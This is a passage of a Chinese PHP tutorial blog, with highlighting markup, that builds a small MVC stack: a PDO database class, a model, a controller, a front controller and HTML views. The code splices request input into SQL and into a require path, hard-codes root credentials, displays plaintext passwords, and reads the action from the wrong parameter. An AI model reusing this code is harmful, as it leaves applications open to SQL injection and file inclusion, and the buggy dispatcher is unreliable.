class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/* Provoke an error -- bogus SQL syntax */</span><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$dbh</span>-&gt;prepare(<span class="hljs-string">&#x27;bogus sql&#x27;</span>);<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$stmt</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nPDO::errorInfo():\n&quot;</span>;    print_r(<span class="hljs-variable">$dbh</span>-&gt;errorInfo());&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">以上例程会输出：</span><span class="hljs-comment"></span><span class="hljs-comment">PDO::errorInfo():</span><span class="hljs-comment">Array</span><span class="hljs-comment">(</span><span class="hljs-comment">    [0] =&gt; HY000</span><span class="hljs-comment">    [1] =&gt; 1</span><span class="hljs-comment">    [2] =&gt; near &quot;bogus&quot;: syntax error</span><span class="hljs-comment">)*/</span><span class="hljs-meta">?&gt;</span></code></pre></div></li></ul><p>下一步是编写查询函数</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//获取单条查询结果</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-variable">$sql</span>)-&gt;fetch(PDO::FETCH_ASSOC);&#125;<span class="hljs-comment">//获取多条查询结果</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetchAll</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-variable">$sql</span>)-&gt;fetchAll(PDO::FETCH_ASSOC);&#125;</code></pre></div><ul><li><a href="https://www.php.net/manual/zh/pdo.query.php">PDO::query</a> — 执行 SQL 语句，以 PDOStatement 对象形式返回结果集</li><li>PDOStatement 类中的fetch方法<ul><li>PDOStatement::fetch — 从结果集中获取下一行</li><li>第一个参数为fetch_style，这里为PDO::FETCH_ASSOC</li><li><code>PDO::FETCH_ASSOC</code>：返回一个索引为结果集列名的数组</li><li>更多参数信息参考：<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></li><li>更多PDOStatement 信息参考：<a href="https://www.php.net/manual/zh/class.pdostatement.php">https://www.php.net/manual/zh/class.pdostatement.php</a></li></ul></li><li></li></ul><p>总代码：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Db</span></span>&#123;    <span class="hljs-comment">//数据库的默认连接参数</span>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dbConfig</span> = [        <span class="hljs-string">&#x27;db&#x27;</span>=&gt;<span class="hljs-string">&#x27;mysql&#x27;</span>,        <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;localhost&#x27;</span>,        <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,        <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;pass&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,        <span class="hljs-string">&#x27;dbname&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>,    ];    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$instance</span> = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">//返回新增的记录id</span>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$insertId</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">//返回受影响记录的数量</span>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span> = <span class="hljs-number">0</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">     * 私有化</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$params</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//初始化连接参数</span>        <span class="hljs-keyword">$this</span>-&gt;dbConfig = array_merge(<span class="hljs-keyword">$this</span>-&gt;dbConfig,<span class="hljs-variable">$params</span>);        <span class="hljs-comment">//连接数据库</span>        <span class="hljs-keyword">$this</span>-&gt;connect();    &#125;    <span class="hljs-comment">/*</span><span class="hljs-comment">     * 禁止外部克隆</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __clone() method.</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInstance</span>(<span class="hljs-params"><span class="hljs-variable">$params</span>=[]</span>)</span>&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">self</span>)&#123;            <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(<span class="hljs-variable">$params</span>);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span>;    &#125;    <span class="hljs-comment">/*</span><span class="hljs-comment">     *</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-comment">//配置数据源DSN</span>            <span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;db&#x27;]&#125;</span>:host=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;host&#x27;]&#125;</span>;</span><span class="hljs-string">            port=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;port&#x27;]&#125;</span>;dbname=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;dbname&#x27;]&#125;</span>;</span><span class="hljs-string">            charset=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;charset&#x27;]&#125;</span>&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dsn</span>,<span class="hljs-keyword">$this</span>-&gt;dbConfig[<span class="hljs-string">&#x27;user&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;dbConfig[<span class="hljs-string">&#x27;pass&#x27;</span>]);            <span class="hljs-comment">//设置客户端的默认字符集</span>            <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SET NAMES <span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;charset&#x27;]&#125;</span>&quot;</span>);        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;数据库连接失败&quot;</span>.<span class="hljs-variable">$e</span>-&gt;getMessage());        &#125;    &#125;    <span class="hljs-comment">/*</span><span class="hljs-comment">     * 完成数据表的写操作：新增、更新、删除</span><span class="hljs-comment">     * 返回受影响的记录，如果是新增返回新增主键id</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;        <span class="hljs-variable">$num</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;exec(<span class="hljs-variable">$sql</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span>)&#123;            <span class="hljs-comment">//如果是新增操作，新增主键id</span>            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span>!==<span class="hljs-keyword">$this</span>-&gt;conn-&gt;lastInsertId())&#123;                <span class="hljs-keyword">$this</span>-&gt;insertId = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;lastInsertId();            &#125;            <span class="hljs-keyword">$this</span>-&gt;num = <span class="hljs-variable">$num</span>;<span class="hljs-comment">//返回受影响的记录数量。</span>        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-variable">$error</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;errorInfo();<span class="hljs-comment">//获取最后操作的错误信息数组</span>            <span class="hljs-comment">//[0]错误标识符[1]错误代码[2]错误信息</span>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;操作失败&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">2</span>];        &#125;    &#125;    <span class="hljs-comment">//获取单条查询结果</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-variable">$sql</span>)-&gt;fetch(PDO::FETCH_ASSOC);    &#125;    <span class="hljs-comment">//获取多条查询结果</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetchAll</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-variable">$sql</span>)-&gt;fetchAll(PDO::FETCH_ASSOC);    &#125;&#125;</code></pre></div><h2 id="测试数据库操作类Db"><a href="#测试数据库操作类Db" class="headerlink" title="测试数据库操作类Db"></a>测试数据库操作类Db</h2><p>编写demo.php</p><p>实例化Db类进行测试</p><p>更新操作</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * Db测试</span><span class="hljs-comment"> */</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model/Db.php&#x27;</span>;<span class="hljs-variable">$db</span> = Db::getInstance();  <span class="hljs-comment">//获取Db类实例</span><span class="hljs-comment">//更新</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;UPDATE users SET username=&quot;dd&quot; WHERE id = 1&#x27;</span>;<span class="hljs-variable">$num</span> = <span class="hljs-variable">$db</span>-&gt;exec(<span class="hljs-variable">$sql</span>);<span class="hljs-comment">//echo &quot;成功更新&quot;.$num.&quot;条数据。&quot;;</span></code></pre></div><p>新增操作测试</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO users(id,username,password) values (4,&#x27;json&#x27;,&#x27;json&#x27;)&quot;</span>;<span class="hljs-variable">$db</span>-&gt;exec(<span class="hljs-variable">$sql</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;成功更新&quot;</span>.<span class="hljs-variable">$db</span>-&gt;num.<span class="hljs-string">&quot;条数据。新增主键id为：&quot;</span>.<span class="hljs-variable">$db</span>-&gt;insertId;</code></pre></div><p>删除操作测试</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;DELETE FROM users WHERE id = 4&#x27;</span>;<span class="hljs-variable">$db</span>-&gt;<span class="hljs-built_in">exec</span>(<span class="hljs-variable">$sql</span>);</code></pre></div><p>单条查询操作</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//查询单条</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT * FROM users where id=1&#x27;</span>;<span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;fetch(<span class="hljs-variable">$sql</span>);print_r(<span class="hljs-variable">$row</span>);</code></pre></div><p>多条记录查询</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>;<span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;fetchAll(<span class="hljs-variable">$sql</span>);print_r(<span class="hljs-variable">$row</span>);</code></pre></div><h2 id="创建公共基础类Model"><a href="#创建公共基础类Model" class="headerlink" title="创建公共基础类Model"></a>创建公共基础类Model</h2><p>编写公共基础类的目的就是为了提高代码的复用率，避免代码的冗余，用户在进行不同的模型定义时，只需要继承公共基础类即可。</p><p>Db\Model.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 公共模型类</span><span class="hljs-comment"> * 完成数据库连接和公共方法</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">//数据库连接对象</span>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;init();  <span class="hljs-comment">//完成数据库连接</span>    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$dbConfig</span> = [            <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,            <span class="hljs-string">&#x27;pass&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,            <span class="hljs-string">&#x27;dbname&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>,        ];        <span class="hljs-keyword">$this</span>-&gt;db = Db::getInstance(<span class="hljs-variable">$dbConfig</span>);    &#125;    <span class="hljs-comment">//获取全部数据</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAll</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users&quot;</span>;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data = <span class="hljs-keyword">$this</span>-&gt;db-&gt;fetchAll(<span class="hljs-variable">$sql</span>);    &#125;    <span class="hljs-comment">//获取单条数据</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data = <span class="hljs-keyword">$this</span>-&gt;db-&gt;fetch(<span class="hljs-variable">$sql</span>);    &#125;&#125;</code></pre></div><ul><li>这里进行了数据库的初始化，可以修改用户配置。调用Db类进行数据库的实例化，存放在Model类的db变量中。</li><li>编写了总共方法getAll和get</li></ul><h2 id="创建用户自定义的模型"><a href="#创建用户自定义的模型" class="headerlink" title="创建用户自定义的模型"></a>创建用户自定义的模型</h2><p>用户自定义的模型实际上就是一张张表，例如，学生信息表，商品表，课程表等。用户模型都有一个公共的特点，都继承于公共模型Model。</p><p>UserModel.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserModel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><span class="hljs-class"></span>&#123;    &#125;</code></pre></div><h2 id="自定义控制器类的制作"><a href="#自定义控制器类的制作" class="headerlink" title="自定义控制器类的制作"></a>自定义控制器类的制作</h2><p>控制器是模块的具体实现。模型是一张表。我们对模型的增删改查，最终都会映射为控制器中的一个具体方法。</p><p>控制器中的方法大多是模型操作的具体实现。大多数控制器类的方法都有对应的视图文件（模板文件）</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listAll</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;getAll();        print_r(<span class="hljs-variable">$data</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>=<span class="hljs-number">1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;get(<span class="hljs-variable">$id</span>);        print_r(<span class="hljs-variable">$data</span>);    &#125;&#125;</code></pre></div><ul><li>这里是创建了UserController控制器，来实例化模型，进行具体的操作。</li></ul><h2 id="创建前端控制器"><a href="#创建前端控制器" class="headerlink" title="创建前端控制器"></a>创建前端控制器</h2><p>前端控制器也可以叫做请求分发器，具有入口文件的功能。</p><p>首先先将模型类文件包含进来。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\Db.php&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\Model.php&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\UserModel.php&#x27;</span>;</code></pre></div><p>假如我们需要请求参数为：c=User&amp;a=listAll时调用UserController中的listAll方法。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//获取控制器</span><span class="hljs-variable">$controller</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-string">&#x27;User&#x27;</span>;<span class="hljs-variable">$controller</span> .= <span class="hljs-string">&#x27;Controller&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;controller/&#x27;</span>.<span class="hljs-variable">$controller</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<span class="hljs-comment">//获取方法</span><span class="hljs-variable">$action</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-string">&#x27;listAll&#x27;</span>;<span class="hljs-comment">//实例化自定义控制器类</span><span class="hljs-variable">$contr</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>();<span class="hljs-variable">$contr</span>-&gt;<span class="hljs-variable">$action</span>();</code></pre></div><p>index.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 前端控制器</span><span class="hljs-comment"> * 请求分发器</span><span class="hljs-comment"> */</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\Db.php&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\Model.php&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;model\UserModel.php&#x27;</span>;<span class="hljs-comment">//获取控制器</span><span class="hljs-variable">$controller</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-string">&#x27;User&#x27;</span>;<span class="hljs-variable">$controller</span> .= <span class="hljs-string">&#x27;Controller&#x27;</span>;<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;controller/&#x27;</span>.<span class="hljs-variable">$controller</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<span class="hljs-comment">//获取方法</span><span class="hljs-variable">$action</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-string">&#x27;listAll&#x27;</span>;<span class="hljs-comment">//实例化自定义控制器类</span><span class="hljs-variable">$contr</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>();<span class="hljs-variable">$contr</span>-&gt;<span class="hljs-variable">$action</span>();</code></pre></div><h2 id="创建视图基本原则"><a href="#创建视图基本原则" class="headerlink" title="创建视图基本原则"></a>创建视图基本原则</h2><ul><li><p>控制器中的一个方法通常与一个视图对应。</p></li><li><p>视图是用来展示数据的</p></li></ul><h2 id="创建展示所有数据的视图"><a href="#创建展示所有数据的视图" class="headerlink" title="创建展示所有数据的视图"></a>创建展示所有数据的视图</h2><p>创建一个文件夹view</p><p>user_list.php</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>学生信息表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;60%&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>username<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>password<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    &lt;?php foreach($data as $usr): ?&gt;        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $usr[&#x27;id&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $usr[&#x27;username&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $usr[&#x27;password&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    &lt;?php endforeach;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>共计：&lt;?php echo count($data);?&gt; 条数据<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>再在UserController.php中包含进来</p><div class="hljs code-wrapper"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listAll</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;getAll();        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;view/user_list.php&#x27;</span>; <span class="hljs-comment">//渲染模板</span><span class="hljs-comment">//        print_r($data);</span>    &#125;</code></pre></div><h2 id="创建展示单条数据的视图"><a href="#创建展示单条数据的视图" class="headerlink" title="创建展示单条数据的视图"></a>创建展示单条数据的视图</h2><p>与所有数据不同的是，单条数据为一维数组，在数组的操作上有所不同</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>学生信息表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;60%&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>字段<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>值<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $data[&#x27;id&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>username<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $data[&#x27;username&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>    <span 